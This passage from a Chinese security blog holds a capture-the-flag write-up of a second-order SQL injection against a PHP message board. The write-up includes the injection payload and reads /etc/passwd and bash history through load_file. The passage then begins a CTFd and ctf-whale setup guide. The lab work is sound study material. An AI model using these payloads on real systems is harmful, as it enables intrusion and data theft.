2018]Comment</a></h2><p>打开题目为留言板，猜测SSTI，sql注入之类的。</p><p>随便留言后跳转登陆界面，sql注入测试无果，看框内字符串，弱密码爆破一波</p><img src="/article/Buuoj-WEB-Write-up/image-20201223193659732.png" class="" title="image-20201223193659732" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203540497.png" class="" title="image-20201223203540497" loading="lazy"><p>爆破密码为<code>zhangwei666</code></p><p>进去尝试SSTI,sql注入无果，但是sql注入语句被过滤。</p><p>站内查找，发现git泄露</p><img src="/article/Buuoj-WEB-Write-up/image-20201223201810099.png" class="" title="image-20201223201810099" loading="lazy"><p><code>writr_do.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>看起来代码肯定是删过的</p><p>然后发现其实原来需要git log 恢复，不得不说，git_extract真香，直接扒出原先的源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>关键语句<code>select category from board where id=</code>，comment查询类别会进行直接查询，所以为sql二次注入</p><p>留言会进行查询，所以现在就要构造二次注入</p><p>语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token string double-quoted-string">"insert into comment set category = '<span class="token interpolation"><span class="token variable">$category</span></span>', content = '<span class="token interpolation"><span class="token variable">$content</span></span>', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><p>其中变量都可控，由于sql中单句换行，<code>#</code>只能注释单行，所以使用<code>/**/</code>注释</p><p>变为</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '',content=user(),/*',                content = '*/#',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>即 <span class="token string double-quoted-string">"insert into comment set category = '',content=user(),/*', content = '*/#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>等价于 <span class="token string double-quoted-string">"insert into comment set category = '',content=user(),#', bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span></code></pre><img src="/article/Buuoj-WEB-Write-up/image-20201223203506275.png" class="" title="image-20201223203506275" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203606551.png" class="" title="image-20201223203606551" loading="lazy"><img src="/article/Buuoj-WEB-Write-up/image-20201223203616701.png" class="" title="image-20201223203616701" loading="lazy"><p>可以执行命令，注入无果， 转而用load_file读取下&#x2F;etc&#x2F;passwd </p><img src="/article/Buuoj-WEB-Write-up/image-20201223204451913.png" class="" title="image-20201223204451913" loading="lazy"><p>www用户有bash执行权限</p><p>读取www用户bash历史记录</p><img src="/article/Buuoj-WEB-Write-up/image-20201223204754524.png" class="" title="image-20201223204754524" loading="lazy"><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp/<span class="token function">unzip</span> html.zip<span class="token function">rm</span> <span class="token parameter variable">-f</span> html.zip<span class="token function">cp</span> <span class="token parameter variable">-r</span> html /var/www/<span class="token builtin class-name">cd</span> /var/www/html/<span class="token function">rm</span> <span class="token parameter variable">-f</span> .DS_Store<span class="token function">service</span> apache2 start</code></pre><p>所以<code>/tmp/html</code>目录没删，但是不知道目录文件，只知道有个<code>.DS_Store</code></p><p>读取发现是乱码，转用hex编码读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223205134946.png" class="" title="image-20201223205134946" loading="lazy"><p>脚本恢复下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2020/12/23 20:52@Auth ： gyy@File ：exp1.py@Blog：http://err0r.top"""</span><span class="token keyword">import</span> binasciihexdata <span class="token operator">=</span> <span class="token string">"00000001427564310000100000000800000010000000040A000000000000000000000000000000000000000000000800000008000000000000000000000000000000000000000002000000000000000B000000010000100000730074007200610070496C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000B000000090062006F006F007400730074007200610070496C6F63626C6F62000000100000004600000028FFFFFFFFFFFF00000000000B0063006F006D006D0065006E0074002E007000680070496C6F63626C6F6200000010000000CC0000002800000001FFFF000000000003006300730073496C6F63626C6F62000000100000015200000028FFFFFFFFFFFF0000000000190066006C00610067005F0038003900340036006500310066006600310065006500330065003400300066002E007000680070496C6F63626C6F6200000010000001D800000028FFFFFFFFFFFF0000000000050066006F006E00740073496C6F63626C6F62000000100000004600000098FFFFFFFFFFFF0000000000090069006E006400650078002E007000680070496C6F63626C6F6200000010000000CC0000009800000002FFFF000000000002006A0073496C6F63626C6F62000000100000015200000098FFFFFFFFFFFF000000000009006C006F00670069006E002E007000680070496C6F63626C6F6200000010000001D800000098FFFFFFFFFFFF000000000009006D007900730071006C002E007000680070496C6F63626C6F62000000100000004600000108FFFFFFFFFFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"</span>data <span class="token operator">=</span> binascii<span class="token punctuation">.</span>a2b_hex<span class="token punctuation">(</span>hexdata<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">".DS_Store"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span></code></pre><p>读取到</p><img src="/article/Buuoj-WEB-Write-up/image-20201223210658137.png" class="" title="image-20201223210658137" loading="lazy"><p>直接读取</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211015299.png" class="" title="image-20201223211015299" loading="lazy"><p>网鼎杯的题还是很顶的</p><p>后记：</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211725414.png" class="" title="image-20201223211725414" loading="lazy"><p>然后发现答案错误…</p><img src="/article/Buuoj-WEB-Write-up/image-20201223211919615.png" class="" title="image-20201223211919615" loading="lazy"><p>正确方法是取<code>/var/www/html/</code>下的那个文件读，因为动态靶机的缘故，送flag进靶机没有照顾到这题呀…</p><hr>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
            <tag> Linux </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</title>
      <link href="article/CTFD/"/>
      <url>article/CTFD/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）"><a href="#CTFD支持动态靶机的搭建笔记（docker：ctfd-ctf-whale）" class="headerlink" title="CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）"></a>CTFD支持动态靶机的搭建笔记（docker：ctfd+ctf-whale）</h1><h2 id="本篇文章最后更新于2021-2-25"><a href="#本篇文章最后更新于2021-2-25" class="headerlink" title="本篇文章最后更新于2021.2.25"></a>本篇文章最后更新于2021.2.25</h2><p>转载请注明来源：<a href="https://err0r.top/article/CTFD/">https://err0r.top/article/CTFD/</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>ctfd可以说是如今最方便的ctf靶场搭建平台，支持各种插件与二次开发，<a href="https://www.zhaoj.in/">赵师傅</a>早前写了一款插件ctf-whale非常方便，但本人在搭建的过程中遇到了不少问题，经过不断研究终于完成，特此记录，以防后期忘记，也供大家交流学习。<br>赵师傅开发的插件是为了适合 <a href="https://buuoj.cn/">buu</a> 的架构,本篇文章采用完整流程+填坑讲解的格式。</p><p>我修改了一份CTFd，已上传github：<a href="https://github.com/Err0rCM/CTFd_with_CTFd-whale">https://github.com/Err0rCM/CTFd_with_CTFd-whale</a> ，启动后仍需按照教程后半部分配置，省去前半部分时间，如有问题请提issue或者从头自行配置。</p><h4 id="强调！"><a href="#强调！" class="headerlink" title="强调！"></a>强调！</h4><p>由于当时国内git clone实在太慢，因为本人未配好代理，所以采用的方法是科学上网下载zip解压的方式，可自行百度git clong与Download zip的区别。本篇文章是用本地下载zip解压上传的方式完成<strong>在服务器上</strong>搭建</p><p>如果阅读中操作出现问题请自行百度，翻到文末查看坑点讲解或者查看其它搭建文章</p><p>这里感谢赵师傅zhaoj，fjh1997等前辈写的文章指导，读者遇到问题或有不足或缺陷的地方请私信我添加改正</p><h2 id="事前准备"><a href="#事前准备" class="headerlink" title="事前准备"></a>事前准备</h2><p><strong>注意</strong>：本机为CentOS7<br>要求：</p><ol><li>已安装基础环境，熟悉linux基本操作</li><li>已安装好 Docker 和 Docker-Compose，并且启用 Docker Swarm，完成换源等操作</li><li>会<em>科学上网</em></li><li>有绝对的耐心</li></ol><p>需求：</p><ol><li>下载赵师傅改写的ctfd，赵师傅已经完成了镜像换源等操作</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd.git -&gt;赵师傅仓库</code></pre><ol start="2"><li>下载frp</li></ol><pre class="language-none"><code class="language-none">wget https:&#x2F;&#x2F;github.com&#x2F;fatedier&#x2F;frp&#x2F;releases&#x2F;download&#x2F;v0.29.0&#x2F;frp_0.29.0_linux_amd64.tar.gztar -zxvf frp_0.29.0_linux_amd64.tar.gz</code></pre><p>也可以直接访问链接下载然后解压上传</p><ol start="3"><li>下载ctf-whale</li></ol><pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;CTFd-Whale</code></pre><ol start="4"><li>下载docker的frps<br>这里在赵师傅仓库里扒拉发现的<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;glzjin&#x2F;Frp-Docker-For-CTFd-Whale</code></pre></li></ol><p>以上除ctfd解压后请确保字母小写，并只有一级文件夹</p><hr><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-docker集群设置"><a href="#1-docker集群设置" class="headerlink" title="1.docker集群设置"></a>1.docker集群设置</h3><p>输入命令</p><pre class="language-none"><code class="language-none">docker swarm initdocker node lsdocker node update --label-add name&#x3D;linux-1 &lt;节点 ID&gt;</code></pre><img src="/article/CTFD/20201017233032375.png" class="" title="docker集群设置" loading="lazy"><p>具体原理等可以查看其它ctfd搭建文章，文末会贴出，这里不做过多阐述</p><h3 id="2-放入ctfd-whale"><a href="#2-放入ctfd-whale" class="headerlink" title="2.放入ctfd-whale"></a>2.放入ctfd-whale</h3><p>将解压的ctfd-whale改小写后放入&#x2F;CTFd&#x2F;CTFd&#x2F;plugins</p><h3 id="3-安装frps（这里有其他教程写的是不对的）"><a href="#3-安装frps（这里有其他教程写的是不对的）" class="headerlink" title="3.安装frps（这里有其他教程写的是不对的）"></a>3.安装frps（这里有其他教程写的是不对的）</h3><p>这里注意下，frp<strong>不是</strong>装在服务器机子上的，简单来说，frps与frpc都是在docker里的。（大坑在这里）<br>frpc是在ctfd里的，frps是在docker机里的</p><p>上传赵师傅的Frp-Docker-For-CTFd-Whale，进入目录后运行<code>docker-compose up -d</code>即可，然后<code>docker ps</code>可看到frps的容器运行中</p><img src="/article/CTFD/202010172331132.png" class="" title="frps" loading="lazy"><p>这里看到frps有28000-28100，这是在<strong>Frp-Docker-For-CTFd-Whale里的docker-compose.yml</strong>，可更改配置后compose</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">frps</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> glzjin/frp<span class="token punctuation">:</span>latest    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./frp<span class="token punctuation">:</span>/conf/    <span class="token key atrule">entrypoint</span><span class="token punctuation">:</span>        <span class="token punctuation">-</span> /usr/local/bin/frps        <span class="token punctuation">-</span> <span class="token punctuation">-</span>c        <span class="token punctuation">-</span> /conf/frps.ini    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> <span class="token string">"28000-28100:28000-28100"</span>     <span class="token comment">#可更改开放端口</span>      <span class="token punctuation">-</span> <span class="token string">"6490:6490"</span>    <span class="token comment">#此处必须与frps.ini配置一致</span>    <span class="token key atrule">networks</span><span class="token punctuation">:</span>        <span class="token key atrule">default</span><span class="token punctuation">:</span><span class="token key atrule">networks</span><span class="token punctuation">:</span>    <span class="token key atrule">default</span><span class="token punctuation">:</span></code></pre><p>再看一下&#x2F;frp&#x2F;frps.ini</p><pre class="language-none"><code class="language-none">[common]bind_port &#x3D; 6490token &#x3D; randomme</code></pre><h3 id="4-配置ctfd"><a href="#4-配置ctfd" class="headerlink" title="4.配置ctfd"></a>4.配置ctfd</h3><p>直接上<strong>ctfd的docker-compose.yml</strong>配置</p><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">'2.2'</span><span class="token key atrule">services</span><span class="token punctuation">:</span>  <span class="token key atrule">ctfd-nginx</span><span class="token punctuation">:</span>    <span class="token key atrule">image</span><span class="token punctuation">:</span> nginx<span class="token punctuation">:</span><span class="token number">1.17</span>    <span class="token key atrule">volumes</span><span class="token punctuation">:</span>      <span class="token punctuation">-</span> ./nginx/http.conf<span class="token punctuation">:</span>/etc/nginx/nginx.conf   <span class="token comment">#这里注意</span>    <span class="token key atrule">user</span><span class="token punctuation">:</span> root    <span class="token key atrule">restart</span><span class="token punctuation">:</span> always    <span class="token key atrule">ports</span><span class="token punctuation">:</span>      <span class="token comment">#- "85:80"     